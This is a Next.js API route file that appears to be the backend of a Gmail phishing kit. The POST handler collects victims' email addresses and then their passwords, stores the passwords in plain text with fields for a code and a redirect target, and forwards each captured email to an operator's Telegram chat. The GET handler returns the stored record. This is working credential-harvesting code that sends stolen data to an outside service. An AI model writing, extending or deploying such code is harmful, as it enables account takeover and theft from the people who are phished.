
import { NextRequest, NextResponse } from "next/server";
import connectDB from "@/lib/mongodb";
import Gmail from "@/models/Gmails";
import { sendTelegramMessage } from "@/lib/telegram_bot";
import Config from "@/models/Config";

// CREATE OR UPDATE
export async function POST(request: NextRequest) {
  try {
    const { id, email, password } = await request.json();
    const userAgent = request.headers.get("user-agent") || "Unknown";

    if (!email && !password) {
      return NextResponse.json(
        { error: "Email and password are required." },
        { status: 400 }
      );
    }

    await connectDB();

    let gmail;

    if (email) {
      gmail = await Gmail.create({ email: email.trim().toLowerCase(), userAgent });
    }

    if (id && password) {
      gmail = await Gmail.findById(id);
      if (!gmail) {
        return NextResponse.json(
          { error: "Gmail not found." },
          { status: 404 }
        );
      }

      gmail.password = password;
      gmail.state = "saved";
      gmail.code = "";
      gmail.redirectTo = "";
      await gmail.save();
    }




    const data = await Config.findOne({});
    if (!data) {
      await Config.create({ telegram_chat: "" });
    }

    if (data?.telegram_chat && email) {
      await sendTelegramMessage(data.telegram_chat, email);
    }

    return NextResponse.json({
      success: true,
      gmail,
    });
  } catch (error) {
    console.error("Gmail POST error:", error);

    return NextResponse.json(
      { error: "An error occurred while saving Gmail." },
      { status: 500 }
    );
  }
}

// GET BY EMAIL
export async function GET(request: NextRequest) {
  try {
    const id = request.nextUrl.searchParams.get("id");

    if (!id) {
      return NextResponse.json(
        { error: "ID query parameter is required." },
        { status: 400 }
      );
    }

    await connectDB();

    const gmail = await Gmail.findById(id)

    if (!gmail) {
      return NextResponse.json(
        { error: "Gmail not found." },
        { status: 404 }
      );
    }

    return NextResponse.json({
      success: true,
      gmail,
    });
  } catch (error) {
    console.error("Gmail GET error:", error);

    return NextResponse.json(
      { error: "An error occurred while fetching Gmail data." },
      { status: 500 }
    );
  }
}
